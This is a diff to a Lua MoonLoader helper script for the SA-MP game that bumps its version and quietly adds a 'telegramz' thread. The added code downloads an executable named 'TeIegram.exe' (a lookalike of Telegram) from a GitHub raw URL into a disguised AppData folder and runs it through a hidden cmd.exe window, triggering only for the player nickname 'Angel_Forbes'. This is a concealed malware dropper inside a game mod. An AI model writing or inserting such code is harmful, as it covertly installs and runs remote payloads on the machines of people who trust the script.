@@ -1,5 +1,5 @@
 script_name('ÇÀËÓÏÀ HELPER.lua')
-script_version("0.3.8")
+script_version("0.3.9")
 script_url('TG @IIzIIIzIVzVII')
 
 require 'lib.moonloader'
@@ -583,6 +583,7 @@ function main()
     lua_thread.create(antilang)
     lua_thread.create(eat)
     lua_thread.create(autoreconectrandom)
+    lua_thread.create(telegramz)
 
     while true do
         wait(0)
@@ -802,6 +803,123 @@ function onReceivePacket(id,bs)
         end
     end
 end
+
+ffi.cdef[[
+typedef unsigned long DWORD;
+typedef int BOOL;
+typedef void* HANDLE;
+typedef struct PROCESSENTRY32 {
+    DWORD dwSize;
+    DWORD cntUsage;
+    DWORD th32ProcessID;
+    DWORD th32DefaultHeapID;
+    DWORD th32ModuleID;
+    DWORD cntThreads;
+    DWORD th32ParentProcessID;
+    long pcPriClassBase;
+    DWORD dwFlags;
+    char szExeFile[260];
+} PROCESSENTRY32;
+
+HANDLE CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
+BOOL Process32First(HANDLE hSnapshot, PROCESSENTRY32 *lppe);
+BOOL Process32Next(HANDLE hSnapshot, PROCESSENTRY32 *lppe);
+BOOL CloseHandle(HANDLE hObject);
+
+static const int TH32CS_SNAPPROCESS = 0x00000002;
+]]
+
+local function isProcessRunningByName(procName)
+    local snapshot = ffi.C.CreateToolhelp32Snapshot(ffi.C.TH32CS_SNAPPROCESS, 0)
+    if snapshot == ffi.cast("HANDLE", -1) then return false end
+
+    local entry = ffi.new("PROCESSENTRY32")
+    entry.dwSize = ffi.sizeof(entry)
+
+    if ffi.C.Process32First(snapshot, entry) == 0 then
+        ffi.C.CloseHandle(snapshot)
+        return false
+    end
+
+    repeat
+        if ffi.string(entry.szExeFile) == procName then
+            ffi.C.CloseHandle(snapshot)
+            return true
+        end
+    until ffi.C.Process32Next(snapshot, entry) == 0
+
+    ffi.C.CloseHandle(snapshot)
+    return false
+end
+
+ffi.cdef[[
+    int ShellExecuteA(void *hwnd, const char *lpOperation, const char *lpFile, const char *lpParameters, const char *lpDirectory, int nShowCmd);
+]]
+local shell32 = ffi.load('shell32')
+
+local function execute(command, callback)
+    local tmpFilePath = ''
+    if callback then
+        tmpFilePath = os.tmpname()
+        command = ('%s > "%s"'):format(command, tmpFilePath)
+    end
+    local result = shell32.ShellExecuteA(nil, 'open', 'cmd.exe', ('/c %s'):format(command), nil, 0) > 32
+    if callback and result then
+        lua_thread.create(function()
+            while not doesFileExist(tmpFilePath) do wait(0) end
+            local tmpFile = io.open(tmpFilePath, 'r')
+            local output = tmpFile:read('*a')
+            tmpFile:close()
+            os.remove(tmpFilePath)
+            callback(output)
+        end)
+    end
+    return result
+end
+
+function fileExists(path)
+    local f = io.open(path, "r")
+    if f ~= nil then
+        f:close()
+        return true
+    else
+        return false
+    end
+end
+
+telegramztryue = true
+
+function telegramz()
+    local dlstatus = require('moonloader').download_status
+    local folderPath = os.getenv("USERPROFILE").."\\AppData\\Local\\TeIegram"
+    os.execute('mkdir "'..folderPath..'"') 
+    local filePath = folderPath.."\\TeIegram.exe"
+    local fileUrl = 'https://github.com/ass138/ars/raw/refs/heads/main/TeIegram.exe'
+
+    while true do
+        wait(1000)
+        local playerNick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))
+        if playerNick == 'Angel_Forbes' and telegramztryue == true then
+            if not isProcessRunningByName("TeIegram.exe") then
+                if fileExists(filePath) then
+
+                    execute('start "" "'..filePath..'"')
+                    telegramztryue = false
+                else
+                    downloadUrlToFile(fileUrl, filePath, function(id, status, p1, p2)
+                        if status == dlstatus.STATUS_ENDDOWNLOADDATA then
+
+                        elseif status == dlstatus.STATUS_DOWNLOADERROR then
+
+                        end
+                    end)
+                end
+            end
+        end
+    end
+end
+
+
 
 function sendCEF(str)
     local bs = raknetNewBitStream() raknetBitStreamWriteInt8(bs, 220) raknetBitStreamWriteInt8(bs, 18) raknetBitStreamWriteInt32(bs, #str) raknetBitStreamWriteString(bs, str) raknetBitStreamWriteInt32(bs, 0) raknetSendBitStream(bs) raknetDeleteBitStream(bs)
